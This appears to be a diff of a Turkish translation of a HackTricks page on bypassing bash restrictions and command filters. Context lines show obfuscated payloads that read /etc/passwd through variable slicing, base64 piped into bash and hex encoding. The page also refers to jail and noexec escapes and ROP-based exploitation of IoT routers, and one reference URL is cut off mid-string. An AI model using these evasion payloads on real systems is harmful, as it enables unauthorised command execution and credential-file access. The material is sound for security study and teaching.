@@ -105,16 +105,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Ters eğik çizgi ve eğik çizgiyi atlatma
+### Ters ve normal eğik çizgiyi atlatma
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Boruları Atlatma
+### Boruları Atla
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Hex kodlama ile atlatma
+### Hex Kodlama ile Atlatma
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -145,7 +145,7 @@ echo ${PATH:0:1} #/
 ### Yerleşik Komutlar
 
 Dış fonksiyonları çalıştıramıyorsanız ve yalnızca RCE elde etmek için **sınırlı bir yerleşik komut setine** erişiminiz varsa, bunu yapmanın bazı pratik yolları vardır. Genellikle **tüm** **yerleşik komutları** kullanamayacaksınız, bu yüzden hapisten kurtulmak için **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'ten.\
-Öncelikle tüm [**shell yerleşik komutlarını**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** İşte bazı **öneriler**:
+Öncelikle tüm [**shell yerleşik komutlarını**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** Ardından burada bazı **öneriler** var:
 ```bash
 # Get list of builtins
 declare builtins
@@ -294,15 +294,17 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Salt Okuma/Sadece Yazma/Distroless Bypass
+## Salt Okuma/Noexec/Distroless Bypass
 
-Eğer **salt okuma ve sadece yazma korumaları** olan bir dosya sistemindeyseniz veya hatta bir distroless konteyner içindeyseniz, **rastgele ikili dosyaları çalıştırmanın, hatta bir shell'in bile yolları vardır!:**
+Eğer **salt okuma ve noexec korumalarına** sahip bir dosya sistemindeyseniz veya hatta bir distroless konteyner içindeyseniz, **rastgele ikili dosyaları çalıştırmanın, hatta bir shell'in bile** yolları vardır!:
+
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & Diğer Hapis Bypass
+## Chroot & diğer Jails Bypass
+
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
@@ -324,7 +326,7 @@ Pratik kullanım durumları:
 
 1. **Bellek haritalı yapılandırma blob'ları** (örneğin NVRAM) süreçler arasında erişilebilir.
 2. Saldırganın yükü hizalamak için NULL baytları yazamadığı durumlar.
-3. Sadece BusyBox `ash`/`sh`'nin mevcut olduğu gömülü cihazlar – bunlar da öncelikli boşlukları yok sayar.
+3. Sadece BusyBox `ash`/`sh`'nin mevcut olduğu gömülü cihazlar – bunlar da önde gelen boşlukları yok sayar.
 
 > 🛠️  Bu numarayı `system()` çağıran ROP gadget'ları ile birleştirerek bellek kısıtlı IoT yönlendiricilerinde istismar güvenilirliğini önemli ölçüde artırın.
 
@@ -333,8 +335,8 @@ Pratik kullanım durumları:
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
-- [Terkedilmiş donanımlarda sıfır günleri istismar etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [Terkedilmiş donanımlarda sıfır günleri istismar etmek – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
